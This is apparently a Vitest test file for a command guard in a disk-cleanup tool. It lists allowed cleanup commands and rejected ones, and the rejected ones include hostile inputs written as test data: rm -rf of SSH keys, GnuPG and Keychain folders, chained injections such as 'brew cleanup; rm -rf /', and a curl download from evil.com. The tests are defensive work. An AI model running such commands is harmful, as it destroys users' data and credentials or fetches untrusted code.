import { describe, it, expect } from 'vitest';
import { homedir } from 'node:os';
import { join } from 'node:path';
import { isRunnable } from '../exec.js';

const HOME = homedir();

describe('isRunnable — allowed commands', () => {
  it('allows npm cache clean', () => expect(isRunnable('npm cache clean --force')).toBe(true));
  it('allows brew cleanup',    () => expect(isRunnable('brew cleanup')).toBe(true));
  it('allows brew autoremove', () => expect(isRunnable('brew autoremove')).toBe(true));

  it('allows docker system prune',    () => expect(isRunnable('docker system prune -f')).toBe(true));
  it('allows docker image prune',     () => expect(isRunnable('docker image prune -f')).toBe(true));
  it('allows docker volume prune',    () => expect(isRunnable('docker volume prune -f')).toBe(true));
  it('allows docker builder prune',   () => expect(isRunnable('docker builder prune -f')).toBe(true));
  it('allows docker container prune', () => expect(isRunnable('docker container prune -f')).toBe(true));

  it('allows xcrun simctl delete unavailable', () => expect(isRunnable('xcrun simctl delete unavailable')).toBe(true));

  it('allows rm of safe absolute path', () => expect(isRunnable(`rm -rf ${HOME}/.gradle`)).toBe(true));
  it('allows rm without -rf flag',      () => expect(isRunnable(`rm ${HOME}/.npmrc`)).toBe(true));

  it('allows git branch delete',    () => expect(isRunnable('git branch -d feature/old')).toBe(true));
  it('allows git worktree remove',  () => expect(isRunnable(`git worktree remove ${HOME}/worktree`)).toBe(true));
  it('allows git -C branch delete', () => expect(isRunnable(`git -C ${HOME}/repos branch -d stale`)).toBe(true));
});

describe('isRunnable — denylist paths', () => {
  it('rejects rm targeting ~/.ssh',      () => expect(isRunnable(`rm -rf ${join(HOME, '.ssh')}`)).toBe(false));
  it('rejects rm targeting ~/.ssh file', () => expect(isRunnable(`rm ${join(HOME, '.ssh', 'id_rsa')}`)).toBe(false));
  it('rejects rm targeting ~/.gnupg',    () => expect(isRunnable(`rm -rf ${join(HOME, '.gnupg')}`)).toBe(false));
  it('rejects rm targeting Keychains',   () => expect(isRunnable(`rm -rf ${join(HOME, 'Library', 'Keychains')}`)).toBe(false));
  it('rejects rm targeting Google',      () => expect(isRunnable(`rm -rf ${join(HOME, 'Library', 'Application Support', 'Google')}`)).toBe(false));
  it('rejects rm targeting Firefox',     () => expect(isRunnable(`rm -rf ${join(HOME, 'Library', 'Application Support', 'Firefox')}`)).toBe(false));
  it('rejects rm targeting /System',     () => expect(isRunnable('rm -rf /System/CoreServices')).toBe(false));
  it('rejects rm targeting /Library',    () => expect(isRunnable('rm -rf /Library/Preferences')).toBe(false));
});

describe('isRunnable — shell metacharacter injection', () => {
  it('rejects semicolon chaining',  () => expect(isRunnable('brew cleanup; rm -rf /')).toBe(false));
  it('rejects pipe',                () => expect(isRunnable('brew cleanup | tee /tmp/out')).toBe(false));
  it('rejects backtick expansion',  () => expect(isRunnable('rm -rf `echo /`')).toBe(false));
  it('rejects dollar expansion',    () => expect(isRunnable('rm -rf $HOME/.ssh')).toBe(false));
  it('rejects double-quoted path',  () => expect(isRunnable('rm -rf "/some/path"')).toBe(false));
  it('rejects single-quoted path',  () => expect(isRunnable("rm -rf '/some/path'")).toBe(false));
  it('rejects redirect',            () => expect(isRunnable('brew cleanup > /tmp/out')).toBe(false));
  it('rejects newline injection',   () => expect(isRunnable('brew cleanup\nrm -rf /')).toBe(false));
  it('rejects carriage return',     () => expect(isRunnable('brew cleanup\rrm -rf /')).toBe(false));
  it('rejects ampersand',           () => expect(isRunnable('brew cleanup & rm -rf /')).toBe(false));
});

describe('isRunnable — unrecognised / unknown commands', () => {
  it('rejects undefined',                 () => expect(isRunnable(undefined)).toBe(false));
  it('rejects empty string',              () => expect(isRunnable('')).toBe(false));
  it('rejects arbitrary shell commands',  () => expect(isRunnable('killall Finder')).toBe(false));
  it('rejects tilde-based rm (no shell)', () => expect(isRunnable('rm -rf ~/Downloads')).toBe(false));
  it('rejects curl command',              () => expect(isRunnable('curl -o /tmp/x http://evil.com')).toBe(false));
  it('rejects relative rm path',         () => expect(isRunnable('rm -rf ./node_modules')).toBe(false));
  it('rejects sudo prefix',              () => expect(isRunnable('sudo rm -rf /tmp')).toBe(false));
});
